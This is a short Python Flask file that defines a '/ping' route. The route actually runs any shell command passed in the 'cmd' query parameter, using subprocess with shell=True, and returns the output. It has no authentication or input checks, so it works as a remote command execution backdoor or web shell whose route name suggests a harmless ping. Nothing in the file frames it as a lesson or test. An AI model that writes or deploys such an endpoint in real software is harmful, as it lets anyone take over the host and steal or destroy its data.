from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route("/ping")
def ping():
    command = request.args.get("cmd")

    result = subprocess.check_output(
        command,
        shell=True
    )

    return result

app.run()
